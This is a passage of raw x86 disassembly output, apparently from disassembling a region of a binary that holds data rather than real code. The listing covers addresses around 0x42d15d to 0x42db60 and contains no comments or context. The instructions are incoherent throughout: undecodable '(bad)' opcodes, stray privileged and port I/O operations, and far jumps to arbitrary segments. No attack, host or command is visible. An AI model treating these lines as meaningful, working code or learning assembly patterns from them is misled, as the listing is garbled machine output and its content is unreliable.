  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [ebp+eax*8-0x1da4ca5a],dh
  42d168:	add    DWORD PTR [eax],eax
  42d16a:	inc    DWORD PTR [eax]
  42d16c:	add    BYTE PTR [eax],al
  42d16e:	or     dh,BYTE PTR [ebp+0x6b]
  42d171:	outs   dx,BYTE PTR ds:[esi]
  42d172:	push   edi
  42d173:	repnz rol BYTE PTR [esi-0x313ebf37],1
  42d17a:	shr    BYTE PTR ds:0x98c89d2d,1
  42d180:	adc    al,0x90
  42d182:	ins    DWORD PTR es:[edi],dx
  42d183:	test   eax,0x6ee73ff5
  42d188:	or     eax,0x309499b5
  42d18d:	or     BYTE PTR ds:0xbc6de55d,bl
  42d193:	shl    BYTE PTR [ebx],0xc9
  42d196:	xchg   ebp,eax
  42d197:	add    BYTE PTR [ebx],0x2c
  42d19a:	imul   BYTE PTR [ecx-0x5dfbafa]
  42d1a0:	ins    BYTE PTR es:[edi],dx
  42d1a1:	jmp    0x613f:0x453927e
  42d1a8:	fxch   st(5)
  42d1aa:	in     eax,0xa9
  42d1ac:	xchg   edx,eax
  42d1ad:	std    
  42d1ae:	loope  0x42d1f1
  42d1b0:	test   ecx,esi
  42d1b2:	repnz cmp DWORD PTR [edx+edx*2-0x35c59e7e],eax
  42d1ba:	sbb    BYTE PTR [esi+ebx*4+0x33],bl
  42d1be:	ficomp WORD PTR [edx-0x27]
  42d1c1:	dec    esi
  42d1c2:	and    ebx,DWORD PTR [esi+edx*4+0x4919e41d]
  42d1c9:	scas   eax,DWORD PTR es:[edi]
  42d1ca:	clc    
  42d1cb:	xchg   DWORD PTR [ebp-0x30],eax
  42d1ce:	add    DWORD PTR [esi+0x4b5d2521],ebx
  42d1d4:	inc    DWORD PTR [esi+0x72ddf01]
  42d1da:	sub    esi,DWORD PTR [edi]
  42d1dc:	fwait
  42d1dd:	rol    BYTE PTR [ebx+0x36],cl
  42d1e0:	jg     0x42d174
  42d1e2:	test   DWORD PTR [esi+0x3f],edx
  42d1e5:	mov    cl,0xa
  42d1e7:	rol    ch,cl
  42d1e9:	ret    
  42d1ea:	sub    eax,0x75ce93e5
  42d1ef:	xchg   esi,eax
  42d1f0:	sahf   
  42d1f1:	xchg   BYTE PTR [edx],ah
  42d1f3:	fisttp WORD PTR [edx]
  42d1f5:	xchg   edi,eax
  42d1f6:	push   ss
  42d1f7:	ror    BYTE PTR ds:[edi-0x13],0x5e
  42d1fc:	test   esi,edx
  42d1fe:	and    eax,0xa4a6b78c
  42d203:	(bad)  
  42d204:	dec    DWORD PTR [esi]
  42d206:	push   ebp
  42d207:	add    cl,BYTE PTR [eax+ebx*2]
  42d20a:	mov    ds:0x8df1c472,al
  42d20f:	xchg   ecx,eax
  42d210:	mov    ds:0xbbf8e446,eax
  42d215:	jg     0x42d242
  42d217:	fiadd  DWORD PTR [edx+edx*2+0x1146ca97]
  42d21e:	(bad)
  42d223:	js     0x42d1e9
  42d225:	arpl   WORD PTR [ebp+0x4820e771],si
  42d22b:	lea    esi,[eax]
  42d22d:	mov    edi,0x28ee08ea
  42d232:	(bad)  
  42d233:	pop    edi
  42d234:	mov    eax,DWORD PTR [eax-0x1]
  42d237:	push   0x51d59469
  42d23c:	ret    
  42d23d:	add    DWORD PTR [eax],0xb39fede9
  42d243:	lea    esp,[ecx+0x37]
  42d246:	sbb    ch,BYTE PTR [edi-0x4]
  42d249:	xor    BYTE PTR [edx],0xb4
  42d24c:	inc    ebp
  42d24d:	mov    ?,WORD PTR [ebp-0x35af6ee9]
  42d253:	je     0x42d2d4
  42d255:	ins    DWORD PTR es:[edi],dx
  42d256:	push   ebx
  42d257:	dec    edx
  42d258:	mov    bl,0xea
  42d25a:	(bad)  
  42d25c:	cmp    al,0x14
  42d25e:	scas   al,BYTE PTR es:[edi]
  42d25f:	push   ebp
  42d260:	icebp  
  42d261:	in     eax,0xd6
  42d263:	sahf   
  42d264:	push   ecx
  42d265:	int    0x68
  42d267:	es push edi
  42d269:	rol    BYTE PTR [edi],1
  42d26b:	inc    ebp
  42d26c:	cmp    DWORD PTR [eax],eax
	...
  42d2d6:	lea    ecx,[eax]
  42d2d8:	pop    ebp
  42d2d9:	jbe    0x42d2b8
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d336
  42d2e3:	das    
  42d2e4:	icebp  
  42d2e5:	repz pop edx
  42d2e7:	jecxz  0x42d2ea
  42d2e9:	add    bh,bh
  42d2eb:	add    BYTE PTR [eax],al
  42d2ed:	add    ch,al
  42d2ef:	shl    BYTE PTR [esi+0x78],1
  42d2f2:	jl     0x42d33b
  42d2f4:	mov    ebx,0xf3b4e68b
  42d2f9:	ret    
  42d2fa:	mov    edi,0x242a0bf8
  42d2ff:	and    ebp,DWORD PTR [esp+edi*4-0x6eab5e27]
  42d306:	fmul   DWORD PTR [edi]
  42d308:	cdq    
  42d309:	test   al,0xdb
  42d30b:	rcl    BYTE PTR [ecx+0xab2acd4],0x81
  42d312:	rcr    BYTE PTR ds:0x61fe76da,cl
  42d318:	cmp    eax,0x3dd5ff05
  42d31d:	inc    edx
  42d31e:	in     eax,dx
  42d31f:	dec    edi
  42d320:	pop    esp
  42d321:	mov    esi,fs
  42d323:	smsw   WORD PTR [edx+0x1cf6adf]
  42d32a:	inc    esi
  42d32b:	pop    ds
  42d32c:	mov    esp,0x84f8d023
  42d331:	sub    dl,BYTE PTR [edi*4-0x6f6bb6a]
  42d338:	(bad)  
  42d339:	sbb    DWORD PTR [eax],edi
  42d33b:	cli    
  42d33c:	sub    al,BYTE PTR [edx+0x7eed8b5c]
  42d342:	cmp    ebx,DWORD PTR [eax+eiz*2+0xa2ce71b]
  42d349:	ins    BYTE PTR es:[edi],dx
  42d34a:	pop    ebx
  42d34b:	push   ebx
  42d34c:	pop    edi
  42d34d:	sahf   
  42d34e:	jae    0x42d2f1
  42d350:	enter  0x7732,0x34
  42d354:	(bad)  
  42d356:	or     al,0x5e
  42d358:	mov    ?,ebp
  42d35a:	jne    0x42d2e8
  42d35c:	or     ebx,DWORD PTR [eax+0x36]
  42d35f:	(bad)  
  42d360:	(bad)  
  42d361:	mov    bh,0x9b
  42d363:	or     eax,0x14abbcb8
  42d368:	in     al,dx
  42d369:	sbb    BYTE PTR [edi+0x7d],dh
  42d36c:	xchg   ecx,eax
  42d36d:	outs   dx,DWORD PTR ds:[esi]
  42d36e:	xor    eax,0xbaed8479
  42d373:	push   0xffffffe1
  42d375:	clc    
  42d376:	test   al,0x38
  42d378:	rcl    DWORD PTR [ebp-0x79],0xd
  42d37c:	xor    al,0xa7
  42d37e:	sbb    BYTE PTR [ebx+0x4ff93e7a],ch
  42d384:	and    BYTE PTR [eax],dh
  42d386:	fmul   st,st(2)
  42d388:	dec    eax
  42d389:	cmc    
  42d38a:	jbe    0x42d3d3
  42d38c:	cmp    esp,DWORD PTR [ecx-0x6d]
  42d38f:	std    
  42d390:	jl     0x42d32d
  42d392:	jp     0x42d3eb
  42d394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d395:	rol    BYTE PTR [edx+0x18c57bc4],1
  42d39b:	adc    eax,0x39c35892
  42d3a0:	retf   0x4abd
  42d3a3:	jle    0x42d39a
  42d3a5:	fisub  DWORD PTR [ecx+0x3e]
  42d3a8:	add    al,0xa2
  42d3aa:	jmp    0x3ed5bc0e
  42d3af:	in     al,dx
  42d3b0:	xchg   edi,eax
  42d3b1:	test   DWORD PTR [edx],0x99ed45b5
  42d3b7:	and    eax,0xa436e3ff
  42d3bc:	jp     0x42d390
  42d3be:	push   0xce76f2c
  42d3c3:	push   esp
  42d3c4:	outs   dx,BYTE PTR ds:[esi]
  42d3c5:	pop    ecx
  42d3c6:	push   edx
  42d3c7:	ds gs aam 0x1e
  42d3cb:	imul   ebx,DWORD PTR [esi],0x221d0f1
  42d3d1:	pop    esp
  42d3d2:	and    al,0x20
  42d3d4:	mov    dh,0x49
  42d3d6:	lods   al,BYTE PTR ds:[esi]
  42d3d7:	sar    DWORD PTR [edi],cl
  42d3d9:	dec    ebp
  42d3da:	cmp    dh,cl
  42d3dc:	xchg   BYTE PTR [ebp+0x434450a2],bl
  42d3e2:	mov    ah,0xb6
  42d3e4:	sub    eax,0xa0d437b5
  42d3e9:	dec    esp
  42d3ea:	add    ebp,0xffffffba
	...
  42d455:	add    cl,al
  42d457:	into   
  42d458:	arpl   WORD PTR [ecx-0x21044291],bx
  42d45e:	pop    ecx
  42d45f:	xchg   esp,eax
  42d460:	aaa    
  42d461:	pushf  
  42d462:	mov    bl,0x90
  42d464:	rcr    ah,1
  42d466:	pop    ecx
  42d467:	in     al,0x1
  42d469:	add    bh,bh
  42d46b:	add    BYTE PTR [eax],al
  42d46d:	add    BYTE PTR [ecx+0x8d5ee02],ch
  42d473:	ja     0x42d487
  42d475:	and    eax,0x18e4ece
  42d47a:	in     eax,0x64
  42d47c:	ret    
  42d47d:	or     sp,WORD PTR [eax+ecx*4+0x12ccfa3]
  42d485:	out    dx,al
  42d486:	mov    edi,0x8caa4444
  42d48b:	stos   DWORD PTR es:[edi],eax
  42d48c:	sub    al,0x24
  42d48e:	lods   eax,DWORD PTR ds:[esi]
  42d48f:	rcr    bh,1
  42d491:	aaa    
  42d492:	xor    ah,BYTE PTR [edx-0x2af9252d]
  42d498:	lds    edi,FWORD PTR [edx+edx*2+0x17008b98]
  42d49f:	mov    bl,0xbf
  42d4a1:	add    BYTE PTR [edi-0x23a3b127],0x73
  42d4a8:	dec    ecx
  42d4a9:	dec    esi
  42d4aa:	adc    esi,ebp
  42d4ac:	lock mov ds:0x22801ca9,eax
  42d4b2:	cmp    BYTE PTR [edi-0x78],bl
  42d4b5:	clc    
  42d4b6:	in     eax,0xb1
  42d4b8:	jmp    0x42d4ca
  42d4ba:	inc    edi
  42d4bb:	out    dx,eax
  42d4bc:	mov    esi,0xf96e688c
  42d4c1:	cld    
  42d4c2:	repz pop ds
  42d4c4:	fs jmp 0x387d:0xaee4b0ce
  42d4cc:	add    al,0x96
  42d4ce:	jbe    0x42d51b
  42d4d0:	sbb    ah,dh
  42d4d2:	adc    DWORD PTR [edi+esi*4-0x1a9daa16],eax
  42d4d9:	loopne 0x42d511
  42d4db:	test   BYTE PTR [edx+0x3d99a896],0xf1
  42d4e2:	xor    BYTE PTR cs:[edx+0x24962048],0x9f
  42d4ea:	into   
  42d4eb:	and    eax,0x4969c425
  42d4f0:	mov    bh,0xb
  42d4f2:	imul   ebp,edx,0xffffff8a
  42d4f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4f6:	pop    es
  42d4f7:	mov    eax,ds:0x997b103e
  42d4fc:	test   DWORD PTR [ecx],ebx
  42d4fe:	sub    eax,0xc5cb9833
  42d503:	mov    WORD PTR [ebp+0x73bde7ac],?
  42d509:	in     al,dx
  42d50a:	add    ebx,esp
  42d50c:	cmp    DWORD PTR [ebx-0x12],ebx
  42d50f:	xchg   esp,eax
  42d510:	pusha  
  42d511:	mov    ebx,0x8e360162
  42d516:	sti    
  42d517:	in     eax,0xf0
  42d519:	div    dl
  42d51b:	int3   
  42d51c:	lods   al,BYTE PTR ds:[esi]
  42d51d:	out    0x60,al
  42d51f:	int    0x9e
  42d521:	(bad)  
  42d522:	push   esp
  42d523:	sbb    eax,0x283a0dec
  42d528:	fwait
  42d529:	js     0x42d51c
  42d52b:	aad    0xef
  42d52d:	push   es
  42d52e:	test   al,0x34
  42d530:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42d532:	fldcw  WORD PTR [esi+0x7d]
  42d535:	cmp    eax,0x15857f3
  42d53a:	push   0xa214d985
  42d53f:	or     edi,ecx
  42d541:	push   edi
  42d542:	push   eax
  42d543:	mov    dh,dh
  42d545:	inc    edx
  42d546:	push   edi
  42d547:	fwait
  42d548:	pop    edx
  42d549:	test   al,0x11
  42d54b:	fild   DWORD PTR [edi-0x5a4f730]
  42d551:	push   edx
  42d552:	icebp  
  42d553:	daa    
  42d554:	std    
  42d555:	sub    ecx,0xfda5e5d6
  42d55b:	cmp    ebx,0x8fc431d2
  42d561:	(bad)  
  42d562:	popf   
  42d563:	add    esi,DWORD PTR [ecx+0x1b]
  42d566:	dec    esi
  42d567:	jbe    0x42d5cf
  42d569:	push   esp
  42d56a:	sub    ecx,DWORD PTR [ebp-0x7e]
	...
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0xa3a8bad5,eax
  42d5e5:	sbb    DWORD PTR [eax-0x1b],ebx
  42d5e8:	add    DWORD PTR [eax],eax
  42d5ea:	inc    DWORD PTR [eax]
  42d5ec:	add    BYTE PTR [eax],al
  42d5ee:	test   DWORD PTR [edx+0x33],esi
  42d5f1:	push   0x37
  42d5f3:	repz jp 0x42d61a
  42d5f6:	mov    edi,0x3a2ede49
  42d5fb:	shr    ecx,1
  42d5fd:	cld    
  42d5fe:	scas   al,BYTE PTR es:[edi]
  42d5ff:	hlt    
  42d600:	(bad)  
  42d601:	jmp    0xf91e:0xdb4557de
  42d608:	loope  0x42d60f
  42d60a:	in     eax,dx
  42d60b:	imul   edx,DWORD PTR [edi],0x7325debb
  42d611:	xlat   BYTE PTR ds:[ebx]
  42d612:	mov    ah,0x6b
  42d614:	pop    eax
  42d615:	xor    al,bh
  42d617:	bound  edi,QWORD PTR [edx+esi*8-0x74]
  42d61b:	jmp    0xfa12c6ec
  42d620:	rep movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42d623:	jecxz  0x42d5e1
  42d625:	jno    0x42d62d
  42d627:	and    bl,BYTE PTR [esi-0x7c]
  42d62a:	push   es
  42d62b:	jmp    ecx
  42d62d:	sbb    DWORD PTR [edi+edx*8+0x5],esi
  42d631:	jne    0x42d6a0
  42d633:	inc    DWORD PTR [ecx+0x69]
  42d636:	std    
  42d637:	push   ds
  42d638:	pop    ebx
  42d639:	outs   dx,BYTE PTR ds:[esi]
  42d63a:	inc    ebx
  42d63b:	mov    edi,0xdb341d9
  42d640:	push   0xff9df1d7
  42d645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d646:	fwait
  42d647:	shl    esi,0x9e
  42d64a:	cs xor eax,0x8572541d
  42d650:	jmp    0x65d3289
  42d655:	adc    al,0xff
  42d657:	rcl    BYTE PTR [ebp+eax*8+0x31],1
  42d65b:	mov    edi,0xd39af767
  42d660:	int3   
  42d661:	or     bl,al
  42d663:	cmp    ecx,DWORD PTR [ecx+0x5]
  42d666:	fdivr  QWORD PTR [ecx]
  42d668:	xor    DWORD PTR [edi],0x19f205f8
  42d66e:	jne    0x42d63e
  42d670:	mov    ch,0x34
  42d672:	inc    edi
  42d673:	jbe    0x42d619
  42d675:	jmp    0x42d65a
  42d677:	scas   al,BYTE PTR es:[edi]
  42d678:	scas   al,BYTE PTR es:[edi]
  42d679:	(bad)
  42d67c:	mov    ah,0x72
  42d67e:	std    
  42d67f:	pop    esp
  42d680:	cs inc esp
  42d682:	sub    ah,bh
  42d684:	inc    ebx
  42d685:	dec    ecx
  42d686:	rcl    BYTE PTR [esi-0x17],1
  42d689:	aam    0xf8
  42d68b:	outs   dx,DWORD PTR ds:[esi]
  42d68c:	jle    0x42d684
  42d68e:	call   0xb63:0xaaf39f03
  42d695:	outs   dx,DWORD PTR ds:[esi]
  42d696:	add    al,0xcf
  42d698:	fisttp WORD PTR [esi]
  42d69a:	ds mov ebx,0xbf899e0
  42d6a0:	aad    0xf5
  42d6a2:	fsub   st(1),st
  42d6a4:	nop
  42d6a5:	jo     0x42d690
  42d6a7:	outs   dx,BYTE PTR ds:[esi]
  42d6a8:	in     eax,0x81
  42d6aa:	test   DWORD PTR [eax+0x48],ecx
  42d6ad:	ins    DWORD PTR es:[edi],dx
  42d6ae:	inc    esi
  42d6af:	cld    
  42d6b0:	jg     0x42d689
  42d6b2:	call   0xaccf:0xe15cdbec
  42d6b9:	ror    DWORD PTR [ebp-0x50],0x7a
  42d6bd:	ror    ch,0xda
  42d6c0:	arpl   sp,cx
  42d6c2:	pop    ebx
  42d6c3:	pop    eax
  42d6c4:	dec    ebp
  42d6c5:	pop    ds
  42d6c6:	call   0xe417bcb
  42d6cb:	mov    al,ds:0x1cc85184
  42d6d0:	inc    esp
  42d6d1:	add    ecx,DWORD PTR [edx]
  42d6d3:	(bad)  
  42d6d4:	sti    
  42d6d5:	sbb    DWORD PTR ds:0xf39aba0,edi
  42d6db:	xor    eax,0x14213159
  42d6e0:	mov    dh,0x8c
  42d6e2:	lock js 0x42d6d1
  42d6e5:	aam    0x7
  42d6e7:	stc    
  42d6e8:	inc    ecx
  42d6e9:	enter  0x2c,0x2a
	...
  42d755:	add    bl,dh
  42d757:	add    esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x4d
  42d763:	mov    bl,0xa1
  42d765:	(bad)  
  42d766:	push   edi
  42d767:	out    0x1,al
  42d769:	add    bh,bh
  42d76b:	add    BYTE PTR [eax],al
  42d76d:	add    BYTE PTR [edi+0x2711b32c],al
  42d773:	jmp    0x6b03:0xac3b3858
  42d77a:	sub    eax,0x3caaa31a
  42d77f:	dec    edi
  42d780:	or     al,0x19
  42d782:	cmp    eax,0xf2edb56d
  42d787:	leave  
  42d788:	xchg   BYTE PTR [edi-0x3da5295c],al
  42d78e:	lea    edx,[eax+eax*1]
  42d791:	xchg   edx,eax
  42d792:	sub    DWORD PTR [ebp+0x6],esi
  42d795:	xchg   esp,eax
  42d796:	je     0x42d761
  42d798:	inc    edx
  42d799:	and    bl,BYTE PTR [esp+eiz*2+0x4d]
  42d79d:	sbb    BYTE PTR ds:0x2c200c34,dl
  42d7a3:	jecxz  0x42d7b1
  42d7a5:	popf   
  42d7a6:	pop    esi
  42d7a7:	xchg   edx,eax
  42d7a8:	in     eax,dx
  42d7a9:	hlt    
  42d7aa:	pop    ebx
  42d7ab:	mov    ecx,0x83bbe886
  42d7b0:	data16 icebp 
  42d7b2:	dec    edi
  42d7b3:	mov    bl,0x54
  42d7b5:	addps  xmm0,XMMWORD PTR [ebp-0x7f]
  42d7b9:	xor    DWORD PTR [ebp-0x27],ebp
  42d7bc:	xchg   DWORD PTR [ebx-0x57],ebp
  42d7bf:	lahf   
  42d7c0:	aas    
  42d7c1:	pop    ds
  42d7c2:	adc    esi,DWORD PTR [eax+edi*4]
  42d7c5:	gs push ds
  42d7c7:	push   ebp
  42d7c8:	dec    esp
  42d7c9:	xor    al,0xfc
  42d7cb:	and    cl,ah
  42d7cd:	mov    esp,0x78820229
  42d7d2:	push   cs
  42d7d3:	arpl   WORD PTR [edx],di
  42d7d5:	mov    esi,0x5bc6409c
  42d7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d7db:	sub    al,0x33
  42d7dd:	xchg   ebx,eax
  42d7de:	jnp    0x42d7af
  42d7e0:	mov    al,0xe4
  42d7e2:	xchg   edi,eax
  42d7e3:	cwde   
  42d7e4:	imul   ecx,ebx,0xffffffb2
  42d7e7:	in     al,0x33
  42d7e9:	test   esi,eax
  42d7eb:	test   eax,0x8b3156ed
  42d7f0:	fild   WORD PTR [edx+0x4aecc4]
  42d7f6:	out    0x9f,eax
  42d7f8:	jns    0x42d7c9
  42d7fa:	jl     0x42d79b
  42d7fc:	xor    cl,BYTE PTR [esi-0x61130fc0]
  42d802:	fidivr DWORD PTR [ebp+esi*4-0x7d78482c]
  42d809:	outs   dx,DWORD PTR ds:[esi]
  42d80a:	xchg   ecx,eax
  42d80b:	ss scas al,BYTE PTR es:[edi]
  42d80d:	mov    edi,0x34dc8ecd
  42d812:	jecxz  0x42d871
  42d814:	push   es
  42d815:	add    DWORD PTR ds:0x9e1edb46,ebx
  42d81b:	hlt    
  42d81c:	pushf  
  42d81d:	mov    edi,0x8352a7a7
  42d822:	push   0xffffffa3
  42d824:	dec    edx
  42d825:	ret    
  42d826:	ja     0x42d851
  42d828:	cmp    dh,BYTE PTR [edi]
  42d82a:	aas    
  42d82b:	sbb    BYTE PTR [eax-0x17],0xea
  42d82f:	cdq    
  42d830:	aaa    
  42d831:	lods   eax,DWORD PTR ds:[esi]
  42d832:	popa   
  42d833:	cdq    
  42d834:	das    
  42d835:	cmp    cl,ch
  42d837:	std    
  42d838:	xchg   edi,eax
  42d839:	xor    eax,edi
  42d83b:	es pop ebx
  42d83d:	or     DWORD PTR [ecx+0x36216199],eax
  42d843:	sbb    al,0xaf
  42d845:	jecxz  0x42d7dc
  42d847:	dec    esi
  42d848:	sbb    dl,dh
  42d84a:	scas   al,BYTE PTR es:[edi]
  42d84b:	or     al,0xda
  42d84d:	xor    DWORD PTR [ebp+0x38fc99ae],eax
  42d853:	xor    ah,ch
  42d855:	pop    ebp
  42d856:	(bad)  
  42d858:	jb     0x42d7e9
  42d85a:	lods   al,BYTE PTR ds:[esi]
  42d85b:	test   DWORD PTR [ebp+0x39],ecx
  42d85e:	scas   eax,DWORD PTR es:[edi]
  42d85f:	sbb    al,0x51
  42d861:	add    ebx,DWORD PTR [eax+0x6b76d2a6]
  42d867:	xchg   dx,ax
  42d869:	adc    DWORD PTR [eax+0x33],edi
  42d86c:	push   ebp
	...
  42d8d5:	add    BYTE PTR [esi-0x62a06765],dl
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0xe3c6961a
  42d8e3:	jecxz  0x42d929
  42d8e5:	push   edx
  42d8e6:	push   esi
  42d8e7:	out    0x1,eax
  42d8e9:	add    bh,bh
  42d8eb:	add    BYTE PTR [eax],al
  42d8ed:	add    cl,dh
  42d8ef:	push   ss
  42d8f0:	mov    eax,ds:0xd3940913
  42d8f5:	(bad)  
  42d8f7:	lahf   
  42d8f8:	ss inc ebp
  42d8fa:	or     al,0xfb
  42d8fc:	(bad)  
  42d8fd:	dec    esi
  42d8fe:	jno    0x42d954
  42d900:	in     eax,dx
  42d901:	imul   DWORD PTR [edi]
  42d903:	mul    BYTE PTR [edx+0x77]
  42d906:	jp     0x42d897
  42d908:	push   ebx
  42d909:	jecxz  0x42d91a
  42d90b:	mov    eax,0xb4968aea
  42d910:	out    0x49,al
  42d912:	mov    dh,0x44
  42d914:	out    dx,eax
  42d915:	cmp    edx,DWORD PTR [eax]
  42d917:	shl    DWORD PTR [ebx+0x1],1
  42d91a:	and    dl,BYTE PTR [edi-0x40]
  42d91d:	and    cl,bh
  42d91f:	mov    bl,0xa7
  42d921:	cmp    al,0x63
  42d923:	call   0x4889be6a
  42d928:	stos   DWORD PTR es:[edi],eax
  42d929:	scas   al,BYTE PTR es:[edi]
  42d92a:	mov    ss,WORD PTR [eax+eiz*1+0x1c]
  42d92e:	pop    ss
  42d92f:	inc    ebp
  42d930:	test   BYTE PTR [edi+0x50a011a4],0x7b
  42d937:	test   eax,0xe5bb87d9
  42d93c:	jmp    0xd9a0:0x10271eaf
  42d943:	fld    QWORD PTR [esi+edx*4]
  42d946:	xchg   DWORD PTR [edi+0x76],ebp
  42d949:	stos   DWORD PTR es:[edi],eax
  42d94a:	cmp    esi,DWORD PTR [esi-0x3c]
  42d94d:	push   0xb3612a7f
  42d952:	push   cs
  42d953:	jecxz  0x42d8e8
  42d955:	ds mov ebp,0xab55b32a
  42d95b:	pushf  
  42d95c:	loop   0x42d966
  42d95e:	push   es
  42d95f:	popf   
  42d960:	inc    BYTE PTR [ebx]
  42d962:	aad    0x1d
  42d964:	pop    ebp
  42d965:	retf   
  42d966:	retf   
  42d967:	or     bl,BYTE PTR [esi]
  42d969:	mov    edi,0xff17c3e
  42d96e:	ins    DWORD PTR es:[edi],dx
  42d96f:	out    0x1d,eax
  42d971:	repnz sbb DWORD PTR [edi+0x1546d260],esp
  42d978:	cdq    
  42d979:	cmp    eax,DWORD PTR [edi-0x37b3a497]
  42d97f:	addr16 adc al,0xc8
  42d982:	jge    0x42d945
  42d984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d985:	jno    0x42d91d
  42d987:	rcl    DWORD PTR [edx],cl
  42d989:	inc    edi
  42d98a:	test   al,0x21
  42d98c:	lods   eax,DWORD PTR ds:[esi]
  42d98d:	shl    BYTE PTR ds:0x98a614b6,cl
  42d993:	dec    esi
  42d994:	cmc    
  42d995:	mov    esp,0xfbbbb3c2
  42d99a:	pusha  
  42d99b:	pusha  
  42d99c:	add    ebp,DWORD PTR [ebx+eax*4]
  42d99f:	into   
  42d9a0:	push   esi
  42d9a1:	in     al,0x16
  42d9a3:	sub    DWORD PTR [esp+ecx*1+0x5d70e314],edx
  42d9aa:	out    dx,eax
  42d9ab:	dec    esp
  42d9ac:	mov    ebp,0x3b308d94
  42d9b1:	shr    BYTE PTR [esp+ecx*4+0x551db8be],0x4a
  42d9b9:	add    eax,0xaef56399
  42d9be:	leave  
  42d9bf:	or     esp,ecx
  42d9c1:	fwait
  42d9c2:	or     BYTE PTR [esi-0x7263035b],dh
  42d9c8:	mov    eax,0x65fb6be8
  42d9cd:	mov    eax,0xedb4c8fd
  42d9d2:	and    esi,edx
  42d9d4:	jae    0x42d9b5
  42d9d6:	xchg   esi,eax
  42d9d7:	mov    edi,DWORD PTR [edx]
  42d9d9:	cmp    BYTE PTR [ebp-0x3],ch
  42d9dc:	sbb    al,0x4e
  42d9de:	push   ecx
  42d9df:	lds    edi,FWORD PTR [ecx+eax*4-0x69]
  42d9e3:	outs   dx,BYTE PTR ds:[esi]
  42d9e4:	lea    edi,[edx+0x31]
  42d9e7:	(bad)
  42d9eb:	jnp    0x42d9e1
	...
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	pop    es
  42da63:	mov    ebp,0xe855fee2
  42da68:	add    DWORD PTR [eax],eax
  42da6a:	inc    DWORD PTR [eax]
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	in     eax,0xad
  42da70:	xchg   ebx,eax
  42da71:	adc    DWORD PTR [edi-0x41ef84a6],edi
  42da77:	cmp    esp,DWORD PTR [eax+0x690d0eb8]
  42da7d:	push   ss
  42da7e:	adc    al,0xba
  42da80:	aaa    
  42da81:	mov    ecx,0xa7ce5a8b
  42da86:	ret    0xc0d6
  42da89:	sti    
  42da8a:	inc    esp
  42da8b:	jmp    0x266c:0xe6b7c274
  42da92:	inc    esi
  42da93:	pop    ebx
  42da94:	adc    ecx,DWORD PTR [eax+0xbf4f4ec]
  42da9a:	mov    al,ds:0x9d95ae70
  42da9f:	mov    ds:0x38f00f82,al
  42daa4:	dec    eax
  42daa5:	call   0x1adc:0x8eb81764
  42daac:	mov    esp,0x7cd01056
  42dab1:	inc    ebx
  42dab2:	aam    0x9e
  42dab4:	mov    eax,esi
  42dab6:	ins    BYTE PTR es:[edi],dx
  42dab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dab8:	fs mov dh,0xad
  42dabb:	mov    bh,dh
  42dabd:	mov    cl,0x8b
  42dabf:	xchg   al,bh
  42dac1:	call   0xb417e07c
  42dac6:	pop    ds
  42dac7:	sbb    eax,0x6c804d22
  42dacc:	sub    DWORD PTR [edx+0x38b53ce],ebp
  42dad2:	(bad)  
  42dad4:	dec    ebp
  42dad5:	sub    DWORD PTR ds:0xa1c92dc4,ebx
  42dadb:	out    0x73,eax
  42dadd:	(bad)  
  42dadf:	dec    esp
  42dae0:	cmp    ch,ah
  42dae2:	retf   
  42dae3:	lock push ds
  42dae5:	adc    eax,0x88608bc0
  42daea:	and    ebp,DWORD PTR [edi-0x43]
  42daed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42daee:	and    eax,0xf8a20f6b
  42daf3:	mov    ds:0x65135fd7,eax
  42daf8:	fcomp  st(7)
  42dafa:	dec    edx
  42dafb:	fwait
  42dafc:	pop    edx
  42dafd:	ins    BYTE PTR es:[edi],dx
  42dafe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42daff:	push   ecx
  42db00:	adc    DWORD PTR [ebp+eax*8-0x1a],0xdeaaa614
  42db08:	pop    edx
  42db09:	(bad)  
  42db0a:	sbb    eax,0x646f44a8
  42db0f:	sbb    al,0xcd
  42db11:	js     0x42db80
  42db13:	cs ret 
  42db15:	outs   dx,BYTE PTR ds:[esi]
  42db16:	xchg   ebx,eax
  42db17:	leave  
  42db18:	test   DWORD PTR [ebp-0x65],edx
  42db1b:	sub    eax,0x92dd9327
  42db20:	jmp    DWORD PTR [ebx+0x2fda79b7]
  42db26:	pop    ebx
  42db27:	imul   esi,eax,0xb
  42db2a:	ficomp DWORD PTR [edx+0x7d561b19]
  42db30:	aam    0x41
  42db32:	xchg   esi,eax
  42db33:	mov    esi,0xbf7c00c7
  42db38:	pop    ebp
  42db39:	ret    0xfdd3
  42db3c:	fisubr WORD PTR [esi+0x3413e916]
  42db42:	enter  0x1ad1,0xc4
  42db46:	popf   
  42db47:	shr    DWORD PTR [ebx-0x4f7af657],0x37
  42db4e:	jge    0x42db2e
  42db50:	int3   
  42db51:	mov    WORD PTR [eax],ds
  42db53:	sub    eax,0x5fe6bdc4
  42db58:	jp     0x42daec
  42db5a:	scas   eax,DWORD PTR es:[edi]
  42db5b:	mov    eax,0xfe8fdb64
  42db60:	test   eax,0x620f5be9
